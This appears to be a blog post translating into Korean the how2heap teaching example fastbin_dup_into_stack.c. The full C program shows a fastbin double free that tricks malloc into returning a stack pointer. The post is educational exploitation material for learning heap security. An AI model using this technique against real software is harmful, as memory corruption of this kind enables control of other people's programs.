---
layout: post
title: how2heap - fastbin_dup_into_stack.c 번역
tags: [system, heap]
---

[원문]



```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
	printf("이 파일은 malloc을 속여 포인터를 원하는 위치(컨트롤 된 위치)로 리턴하게 하는 fastbin-dup.c의 확장판이다.(이번 경우에는 stack을 설명한다.)\n");

	unsigned long long stack_var;

	printf("우리가 malloc()이 리턴하길 원하는 주소는 %p이다.\n", 8+(char *)&stack_var);

	printf("3개의 버퍼를 할당한다.\n");
	int *a = malloc(8);
	int *b = malloc(8);
	int *c = malloc(8);

	printf("1st malloc(8): %p\n", a);
	printf("2nd malloc(8): %p\n", b);
	printf("3rd malloc(8): %p\n", c);

	printf("첫 번째 것을 free한다.\n");
	free(a);

	printf("%p를 다시 프리하면, %p가 free list의 맨 위에 있으므로 크래시가 난다.\n", a, a);
	// free(a);

	printf("따라서 대신에 %p를 free할 것이다.\n", b);
	free(b);

	printf("이제 %p가 free list의 맨 위에 있지 않으므로, %p를 다시 free할 수 있다.\n", a, a);
	free(a);

	printf("현재 free list는 [ %p, %p, %p ]이다. "
		"우리는 이제 %p의 데이터를 수정함으로 써 공격을 수행할 것이다.\n", a, b, a, a);
	unsigned long long *d = malloc(8);

	printf("1st malloc(8): %p\n", d);
	printf("2nd malloc(8): %p\n", malloc(8));
	printf("현재 free list는 [ %p ]이다.\n", a);
	printf("이제 우리는 %p가 free list의 맨 위에 남아있는 동안 %p에 접근 할 수 있다.\n"
		"그래서 이제 스택에 가짜 free size(이 경우에는 0x20)을 쓰고,\n"
		"malloc이 그곳에 free된 청크가 있다고 생각하게 만든 후\n"
		"포인터를 그곳으로 리턴하게 만든다.\n", a, a);
	stack_var = 0x20;

	printf("이제 0x20 다음 주소를 가리키게 하기 위해서 %p의 데이터의 첫 8바이트를 덮어 쓴다\n", a);
	*d = (unsigned long long) (((char*)&stack_var) - sizeof(d));

	printf("3rd malloc(8): %p, putting the stack address on the free list\n", malloc(8));
	printf("4th malloc(8): %p\n", malloc(8));
}
```



[원문]: <https://github.com/shellphish/how2heap/blob/master/fastbin_dup_into_stack.c>